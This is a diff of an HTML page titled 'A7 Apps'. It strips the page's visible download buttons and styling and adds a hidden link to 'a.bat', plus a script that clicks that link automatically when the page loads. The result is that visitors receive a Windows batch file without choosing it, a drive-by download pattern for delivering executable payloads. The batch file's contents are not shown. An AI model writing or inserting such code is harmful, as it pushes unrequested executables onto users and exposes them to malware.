@@ -1,20 +1,15 @@
 <html>
 <head>
             <title>A7 Apps</title>
-            <link rel="stylesheet" type="text/css" href="style.css">
-            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<div onload="download()"></div>
+<a id="dl" style="display: none" 
+    href="a.bat" 
+    download>Download</a>
+
+<script>
+(function download() {
+    document.getElementById('dl').click();
+})()
+</script>
 </head>
-<body>
-                        <div class="cntainer">
-                                    <form>
-                                                <button><i class="fa fa-download"></i></button>
-                                                <button><i class="fa fa-download"></i></button>
- 
-                                                <br>
- 
-                                                <button><i class="fa fa-download"></i></button>
-                                                <button><i class="fa fa-download"></i></button>
-                                    </form>
-                        </div>
-</body>
 </html>
